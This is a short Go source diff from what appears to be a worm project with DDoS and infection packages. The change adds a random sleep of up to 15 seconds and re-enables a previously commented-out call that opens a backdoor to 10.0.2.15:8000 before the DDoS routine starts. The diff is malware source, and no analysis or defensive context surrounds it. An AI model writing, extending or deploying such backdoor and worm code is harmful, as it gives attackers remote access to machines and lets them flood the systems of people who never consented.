@@ -8,6 +8,9 @@ import (
 	"github.com/99graciamanel/mlw/worm/ddos"
 	"strconv"
 	//"os/exec"
+	
+	"math/rand"
+	"time"
 )
 
 func attack(wg *sync.WaitGroup, id int, ip string) {
@@ -56,8 +59,17 @@ func attack(wg *sync.WaitGroup, id int, ip string) {
 	wg.Done()
 }
 
+func randomNumber(max int) int {
+	rand.Seed(time.Now().UnixNano())
+	min := 1
+	return rand.Intn(max-min+1) + min
+}
+
 func main() {
-	//go infection.OpenBackdoor("10.0.2.15:8000")
+	x := randomNumber(15)
+	time.Sleep(time.Duration(x) * time.Second)
+		
+	go infection.OpenBackdoor("10.0.2.15:8000")
 	var wg sync.WaitGroup
 	wg.Add(1)
 	go ddos.Hello(&wg,"test")
